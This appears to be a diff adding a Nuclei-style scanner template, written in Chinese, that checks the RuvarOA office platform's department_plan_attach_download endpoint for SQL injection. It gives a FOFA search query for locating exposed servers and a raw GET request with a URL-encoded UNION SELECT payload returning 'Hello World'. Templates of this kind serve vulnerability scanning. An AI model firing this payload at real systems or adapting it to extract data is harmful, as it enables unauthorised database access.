@@ -1,0 +1,27 @@
+id: ruvaroa-dept_plan_attach_download-sqli
+
+info:
+  name: "RuvarOA协同办公平台 department_plan_attach_download 接口存在SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="txt_admin_key"
+      
+      RuvarOA协同办公平台在department_plan_attach_download接口处理过程中存在SQL注入缺陷。攻击者可利用该漏洞通过构造恶意输入执行任意SQL命令，导致数据库数据篡改、敏感信息泄露或服务中断。
+      
+  tags: RuvarOA协同办公平台
+
+http:
+- raw:
+  - |
+    GET /DepartmentPlan/department_plan_attach_download.aspx?sys_file_storage_id=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%2872%29%2bCHAR%28101%29%2bCHAR%28108%29%2bCHAR%28108%29%2bCHAR%28111%29%2bCHAR%2832%29%2b%2bCHAR%2887%29%2bCHAR%28111%29%2bCHAR%28114%29%2bCHAR%28108%29%2bCHAR%28100%29%2bCHAR%2833%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'Hello World'
